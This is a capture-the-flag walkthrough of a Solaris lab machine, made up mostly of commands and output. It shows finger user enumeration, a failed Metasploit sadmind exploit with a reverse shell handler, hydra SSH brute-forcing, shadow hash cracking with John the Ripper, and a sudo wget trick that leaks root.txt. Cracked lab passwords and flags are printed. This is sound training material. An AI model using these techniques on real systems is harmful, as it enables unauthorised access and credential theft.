# MACHINE CHALLENGE: SUNDAY

## Challenge Description

##### Own system
Type below the hash that is inside the root.txt file in the machine. The file
can be found under /root on Linux machines and at the Desktop of the
Administrator on Windows.

##### Own User
Type below the hash that is inside the user.txt file in the machine. The file
can be found under /home/{username} on Linux machines and at the Desktop of the
user on Windows. 

```
IP Address: 10.10.10.76
OS: Solaris
```

### PORTSCANNING w/ NMAP

As always, we start with a `nmap` portscan..

```
$ nmap -sV -Pn 10.10.10.76

Starting Nmap 7.60 ( https://nmap.org ) at 2018-09-05 23:40 EDT
Nmap scan report for 10.10.10.76
Host is up (0.48s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
79/tcp  open  finger  Sun Solaris fingerd
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.15 seconds
```

We find our target server has two ports open: 79 (FINGER) and 111 (RPCBIND).

### FINGER

Quick search online informs us that Solaris `finger` service is vulnerable
to user enumeration.

```
Older versions of Solaris that run the finger daemon are affected by an
enumeration bugs. For example you can run the command finger 0@host and it
will enumerate all users with an empty GCOS field in the password file. 
Additionally you can run finger ‘a b c d e f g h’@host and it will
enumerate all users on the remote target.

https://pentestlab.blog/tag/finger/
```

Knowing this, we turn to `metasploit` to help us out with this exploit..

```
msf > use auxiliary/scanner/finger/finger_users
msf auxiliary(scanner/finger/finger_users) > set RHOSTS 10.10.10.76
RHOSTS => 10.10.10.76
msf auxiliary(scanner/finger/finger_users) > run

[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: adm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: lp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: uucp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nuucp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dladm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: listen
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: bin
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: daemon
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: gdm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: noaccess
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody4
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: postgres
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: root
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: svctag
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sys
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: xvm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: openldap
[+] 10.10.10.76:79        - 10.10.10.76:79 Users found: adm, bin, daemon, dladm, gdm, listen, lp, noaccess, nobody, nobody4, nuucp, openldap, postgres, root, svctag, sys, uucp, xvm
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### RPCBIND

Now that we have a list of users enumerated from `finger`, let's take a look at our
other open port. Searching around for vulnerabilities of this service on Solaris, we
actually find something that might allow us to get a session.

```
https://www.theregister.co.uk/2017/04/11/solaris_shadow_brokers_nsa_exploits/
```

However, trying the exploit didn't seem to work.

```
msf > use exploit/solaris/sunrpc/sadmind_exec
msf exploit(solaris/sunrpc/sadmind_exec) > set RHOST 10.10.10.76
RHOST => 10.10.10.76
msf exploit(solaris/sunrpc/sadmind_exec) > exploit

[*] Started reverse TCP double handler on 10.10.16.53:4444
[-] 10.10.10.76:111 - Exploit failed: Rex::Proto::SunRPC::RPCError 10.10.10.76:111 - SunRPC - XDR decoding failed in sunrpc_create
[*] Exploit completed, but no session was created.
```

### EXPANDED PORT SCAN

Our default port scan didn't seem to yield any entry point to the system, and not
quite sure what to try next.. we attempt an expanded port scan across all the ports
(`-p-` option) and not just the most commonly exposed ports (which is default for
`nmap`).

```
$ sudo nmap -p- -v -n -sS -T4 10.10.10.76
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-06 10:22 EDT
Initiating Ping Scan at 10:22
Scanning 10.10.10.76 [4 ports]
Completed Ping Scan at 10:22, 0.28s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:22

<...>

PORT      STATE    SERVICE
22022/tcp open     unknown
49725/tcp open     unknown
```

Interesting.. what is port `22022` and `49725`? Let's do a more indepth targeted
scan at them..

```
$ sudo nmap -p22022  -n -sS -T4 10.10.10.76 -A
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-06 11:47 EDT
Nmap scan report for 10.10.10.76
Host is up (0.43s latency).

PORT      STATE SERVICE VERSION
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey:
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Sun OpenSolaris 2008.11 (94%), Sun Solaris 10 (94%), Sun Solaris 9 or 10, or OpenSolaris 2009.06 snv_111b (94%), Sun Solaris 9 or 10 (SPARC) (92%), Sun Storage 7210 NAS device (92%), Sun Solaris 9 or 10 (92%), Oracle Solaris 11 (91%), Sun Solaris 8 (90%), Sun Solaris 9 (89%), Sun Solaris 8 (SPARC) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22022/tcp)
HOP RTT       ADDRESS
1   390.89 ms 10.10.16.1
2   183.75 ms 10.10.10.76

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.89 seconds
```

```
$ sudo nmap -p49725  -n -sS -T4 10.10.10.76 -A
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-07 09:35 EDT
Nmap scan report for 10.10.10.76
Host is up (0.52s latency).

PORT      STATE SERVICE   VERSION
49725/tcp open  smserverd 1 (RPC #100155)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Sun OpenSolaris 2008.11 (94%), Sun Solaris 10 (94%), Sun Solaris 9 or 10 (93%), Sun Solaris 9 or 10, or OpenSolaris 2009.06 snv_111b (93%), Sun Solaris 9 or 10 (SPARC) (92%), Sun Storage 7210 NAS device (91%), Oracle Solaris 11 (89%), Sun Solaris 9 (89%), Sun Solaris 8 (89%), Sun Solaris 8 (SPARC) (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 49725/tcp)
HOP RTT       ADDRESS
1   323.77 ms 10.10.16.1
2   163.76 ms 10.10.10.76

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.01 seconds
```

wooo.. `ssh`. and we also have `smserverd`?

### SSH

Can we use the list of users leaked by `finger` to guess our way into `ssh`?

```
$ ssh postgres@10.10.10.76 -p 22022
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

$ ssh postgres@10.10.10.76 -p 22022 -oKexAlgorithms=+diffie-hellman-group1-sha1
```

```
$ hydra -v  -L ./userfile.txt -P /usr/share/wordlists/rockyou.txt -e nsr -u -s 22022 -t 1 -w 300 -W 360 -c 180 -o ./hydra.out ssh://10.10.10.76
```

Running `hydra` didn't yield a working user/password combination.

### FINGER REVISITED

Feeling like I was hitting a wall, decided to go back and take a look at the list of
users we enumerated from the `finger` service to see if we missed anything. The list
of users we discovered was based off of the `unix_users.txt` list of common default
unix account names. What if we tried different account list?

```
msf > use auxiliary/scanner/finger/finger_users
msf auxiliary(scanner/finger/finger_users) > set RHOSTS 10.10.10.76
RHOSTS => 10.10.10.76
msf auxiliary(scanner/finger/finger_users) > show options

Module options (auxiliary/scanner/finger/finger_users):

   Name        Current Setting                                                Required  Description
   ----        ---------------                                                --------  -----------
   RHOSTS      10.10.10.76                                                    yes       The target address range or CIDR identifier
   RPORT       79                                                             yes       The target port (TCP)
   THREADS     1                                                              yes       The number of concurrent threads
   USERS_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes
   The file that contains a list of default UNIX accounts.

msf auxiliary(scanner/finger/finger_users) > set USERS_FILE /usr/share/metasploit-framework/data/wordlists/common_roots.txt
USERS_FILE => /usr/share/metasploit-framework/data/wordlists/common_roots.txt
msf auxiliary(scanner/finger/finger_users) > run
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sammy
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: noaccess
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody4
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: adm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: lp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: uucp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nuucp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dladm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: listen
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: svctag
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: xvm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: openldap
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: bin
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: daemon
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: postgres
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: root
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sunny
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sys
[+] 10.10.10.76:79        - 10.10.10.76:79 Users found: adm, bin, daemon, dladm, listen, lp, noaccess, nobody, nobody4, nuucp, openldap, postgres, root, sammy, sunny, svctag, sys, uucp, xvm
[*] Scanned 1 of 1 hosts (100% complete)

[*] Auxiliary module execution completed
```

Enumerating with a different list of potential users pops two more additional users
on the system - `sammy` and `sunny`. Wonder if `sunny` is in any way a reference to
the machine name `sunday`?

```
$ hydra -V -l sunny -P /usr/share/wordlists/rockyou.txt -e nsr -u -s 22022 -t 1 -o ./hydra.out ssh://10.10.10.76
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-09-10 11:12:46
[DATA] max 1 task per 1 server, overall 1 task, 14344402 login tries (l:1/p:14344402), ~14344402 tries per task
[DATA] attacking ssh://10.10.10.76:22022/
[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "sunny" - 1 of 14344402 [child 0]
```

`hydra` was taking forever, so decided to do some guesses on my own to manually see
if I could get the password.. and eventually found it! (passwd: `sunday`). Eventually
`rockyou.txt` would've gotten me there.

```
$ ssh sunny@10.10.10.76 -p 22022 -oKexAlgorithms=+diffie-hellman-group1-sha1
Password:
Last login: Mon Sep 10 15:34:39 2018 from 10.10.12.140
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ ls
Desktop  Documents  Downloads  local.cshrc  local.login  local.profile  Public
sunny@sunday:~$ pwd
/export/home/sunny
```

Searching around `sunny` home directory doesn't yield a `user.txt`, but eventually
we find another system user `sammy` which has what we want..

```
sunny@sunday:~$ ls ..
sammy  sunny
sunny@sunday:~$ ls ../sammy/
Desktop  Documents  Downloads  Public
sunny@sunday:~$ ls ../sammy/Desktop/
user.txt
sunny@sunday:~$ cd ../sammy/Desktop/
sunny@sunday:/export/home/sammy/Desktop$ cat user.txt
cat: user.txt: Permission denied
```

.. but we don't have permission to access it :-(

### SYSTEM ENUMERATION

Tried peaking at `.bash_history` to see if we could find any hints, but was blocked.

```
sunny@sunday:~$ ls -l .bash_history
-rw------- 1 root root 0 2018-04-24 09:10 .bash_history
sunny@sunday:~$ ls -l ../sammy/.bash_history
-rw------- 1 root root 0 2018-04-24 11:28 ../sammy/.bash_history
```

Tried to see if we could `sudo`, but didn't get very far either..

```
sunny@sunday:/export/home/sammy/Desktop$ sudo cat user.txt

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password:
Sorry, user sunny is not allowed to execute '/usr/gnu/bin/cat user.txt' as root on sunday.
```

Uploaded our Linux enum script to the system to see if it yielded any interesting
information..

```
$ scp -P 22022 ../../scripts/enum-tools/LinEnum.sh sunny@10.10.10.76:/tmp/filo.sh
Password:
LinEnum.sh                                         100%   39KB  39.2KB/s   00:01
```

And we found a troll waiting for us..

```
ESC[00;33mWe can sudo without supplying a password!ESC[00m
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
```

```
sunny@sunday:/tmp$ sudo /root/troll
testing
uid=0(root) gid=0(root)
```

### OWN USER

Eventually manually crawling the filesystem starting from `/`, we came across an
interesting directory..

```
sunny@sunday:/$ ls -l backup
total 2
-r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup
sunny@sunday:/$ cd backup/
sunny@sunday:/backup$ cat agent22.backup
cat: agent22.backup: Permission denied
sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Is this really a backup of the `/etc/shadow` that contains the password hashes of
our users?? Let's pull it down and work on it locally..

```
$ scp -P 22022 sunny@10.10.10.76:/backup/shadow.backup .
Password:
shadow.backup                                      100%  319     1.5KB/s   00:00
```

Okay.. we need to know what the hash `$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB` corresponds to.

Looking up the format of `/etc/shadow`, we come to know that..

```
The hash field itself is comprised of three different fields. They are separated by
'$' and represent:

 1. Some characters which represents the cryptographic hashing mechanism used to
    generate the actual hash
 2. A randomly generated salt to safeguard against rainbow table attacks
 3. The hash which results from joining the users password with the stored salt and
    running it through the hashing mechanism specified in the first field

https://www.aychedee.com/2012/03/14/etc_shadow-password-hash-formats/
```

So in our case:

 1. Mechanism: `5` (`sha256`)
 2. Salt: `Ebkn8jlK`
 3. Hash: `i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB`

Let's try `John the Ripper` to see if we can crack the hash.

```
$ /usr/sbin/john --wordlist=/usr/share/john/password.lst --rules shadow.backup --format=sha256crypt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
sunday           (sunny)
1g 0:00:01:40 DONE (2018-09-10 22:15) 0.009973g/s 1562p/s 1582c/s 1582C/s Changeiting..Sssing
Use the "--show" option to display all of the cracked passwords reliably
Session completed
 /usr/sbin/john --show shadow.backup
sunny:sunday:17636::::::

1 password hash cracked, 1 left
```

Okay.. so we were able to crack the hash of the password we already know, but we need
to do a little more work for `sammy`.

```
$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt --rules shadow.backup --format=sha256crypt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
Remaining 1 password hash
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (sammy)
1g 0:00:02:11 DONE (2018-09-10 22:30) 0.007590g/s 1546p/s 1546c/s 1546C/s coolster..chs2009
Use the "--show" option to display all of the cracked passwords reliably
Session completed
$ /usr/sbin/john --show shadow.backup
sammy:cooldude!:6445::::::
sunny:sunday:17636::::::
```

Awesome.. finally got it. Now let's `ssh` in as `sammy`.

```
$ ssh sammy@10.10.10.76 -p 22022 -oKexAlgorithms=+diffie-hellman-group1-sha1
Password:
Last login: Tue Sep 11 01:13:56 2018 from 10.10.15.15
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sammy@sunday:~$ ls
Desktop  Documents  Downloads  Public  test.sh
sammy@sunday:~$ cat Desktop/user.txt
a3d9498027ca5187ba1793943ee8a598
```

### OWN SYSTEM

Something else interesting I discovered after logging in as `sammy`, was that running
our Linux Enum script again showed that `sammy` has different `sudo` abilities than
`sunny`..

```
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

Looking up the `manpage` for `wget`, we find an interesting option that we could
perhaps abuse..

```
       -i file
       --input-file=file
           Read URLs from a local or external file.  If - is specified as file,
           URLs are read from the standard input.  (Use ./- to read from a file
           literally named -.)
```

What if we tried to read `/root/root.txt` by passing it in as the parameter to `-i`?
The command would fail since it wouldn't make sense to `wget`, but highly likely the
error message would dump the contents.

```
$ sudo wget -i /root/root.txt
/root/root.txt: Invalid URL fb40fab61d99d37536daeec0d97af9b8: Unsupported scheme
No URLs found in /root/root.txt.
```

Weeeeeee~~~
